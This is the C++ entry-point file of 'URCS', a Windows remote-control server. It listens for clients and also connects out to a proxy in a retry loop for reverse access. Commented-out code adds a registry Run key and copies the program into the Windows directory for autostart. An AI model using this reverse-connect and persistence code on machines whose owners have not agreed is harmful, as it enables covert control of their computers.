/*
All CopyRights Reserved.
Created by unmanarc.com. emailme to: unma@unmanarc.com
this source are under GNU/GPL (General Public Licence)
http://urcs.unmanarc.com/
http://urcs.sourceforge.net/

by unmanarc.
thanks to all.
enjoy ;)
*/
// urcs.cpp : Defines the entry point for the application.
// Unmanarc Remote Control Server - URCS

#include "stdafx.h"
#include "core_s.h" // Server Core
#include "urcs.h" 
#include "Server.h" // TCP Server Initialization
#include "winsock2.h" // Winsock definitions.
#include "proxy.h"
#include "connector.h"

/*
Unmanarc implementation of client managment...
Special thanks to: 

TheCPUWizard: for the idea of algorithm to transmit data with nagle implementing a new header.
Bistok: for OOP help
DanM: for help about socket's functions / hostnames
*/


Ccore newcore; //Create global core object for managment of connection
char ipl[256];
BOOL bye=0;

UINT eprx(LPVOID pParam)
{
	//Connect to the proxy.
	Cproxy mpr;
	while (1) //infinite loop for connect to server
	{
		Sleep(1000); //Wait 1 second 
		int i=-1; //indicator.
		SOCKET sk=mpr.connectto(); //Connect to socket and prepair it for instance's
		if(sk==0)
			Sleep(60000); //wait 1 minute for reconnect if don't success.
		else 
			i=newcore.start_instance(sk,1,"255.255.255.255"); // Start the process to manage connection proxy
		if (i==0) closesocket(sk); //When finish close the connection
		if (i==-15) //exit signal
		{
			bye=1;
			Cconnector cn;
			cn.connectto("127.0.0.1",newcore.data_g.port);
		}
	}
	return 0;
}

UINT newinstance(LPVOID pParam)
{
	char ipm[256];
	strcpy(ipm,ipl);
	int i=newcore.start_instance((SOCKET)pParam,0,ipm); // Start the process to manage connection
	if (i==0) closesocket((SOCKET)pParam); //When finish close the connection
	if (i==-15) //exit signal
	{
		bye=1;
		Cconnector cn;
		cn.connectto("127.0.0.1",newcore.data_g.port);
	}
	return 0; // Process finish, return 0
}

int APIENTRY _tWinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPTSTR    lpCmdLine,int       nCmdShow)
{
//	char *pdest;
	char commandline[512];
	strncpy(commandline,lpCmdLine,512);
	strupr(commandline);
//   pdest = strstr( string, str );
  
	if (strstr(commandline,"DELAY")!=NULL) 
		Sleep(5000); // Wait 5 seconds for start new server

	CUserver server; //Start new server instance
	newcore.data_g.LoadData(); //Get ini
	/*auto-install...
	*/

	//installed...
	// this code is for auto-startup (if you need to prevent for reboot before remote installation)
	// by default is disabled.

	/*	newcore.data_g.PutKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "URCS","rms");
	newcore.data_g.CopyMeToWinDir(); */
	
	//finish

	AfxBeginThread(eprx,NULL); //Start proxy out connection
	if (server.startserver(newcore.data_g.port)>0)
	{
		strcpy(ipl,"");
		while (1)
		{
			SOCKET n=server.s_accept(ipl); //Wait for client connection and parse as global
			if (bye) return 0;
            AfxBeginThread(newinstance,(LPVOID)n); //Start Another thread for my client... and go to background.
		}
	}
	else Sleep(INFINITE); //If can't start server, Sleep Infinite for wait for outgoing proxy.
	return 0;
}